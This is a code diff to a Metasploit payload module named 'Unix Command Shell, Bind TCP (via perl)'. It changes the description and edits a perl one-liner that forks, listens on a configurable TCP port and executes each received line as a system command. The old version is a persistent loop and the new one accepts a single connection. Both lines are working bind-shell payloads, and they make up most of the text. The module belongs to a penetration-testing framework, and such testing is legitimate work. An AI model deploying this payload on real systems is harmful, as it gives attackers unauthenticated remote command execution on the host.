@@ -23,7 +23,7 @@ module Metasploit3
 		super(merge_info(info,
 			'Name'          => 'Unix Command Shell, Bind TCP (via perl)',
 			'Version'       => '$Revision$',
-			'Description'   => 'Listen for a connection and spawn a command shell via perl (persistent)',
+			'Description'   => 'Listen for a connection and spawn a command shell via perl',
 			'Author'        => ['Samy <samy@samy.pl>', 'cazz'],
 			'License'       => BSD_LICENSE,
 			'Platform'      => 'unix',
@@ -52,7 +52,7 @@ module Metasploit3
 	#
 	def command_string
 
-		cmd = "perl -MIO -e '$p=fork();exit,if$p;while($c=new IO::Socket::INET(LocalPort,#{datastore['LPORT']},Reuse,1,Listen)->accept){$~->fdopen($c,w);STDIN->fdopen($c,r);system$_ while<>}'"
+		cmd = "perl -MIO -e '$p=fork();exit,if$p;$c=new IO::Socket::INET(LocalPort,#{datastore['LPORT']},Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);system$_ while<>'"
 
 		return cmd
 	end
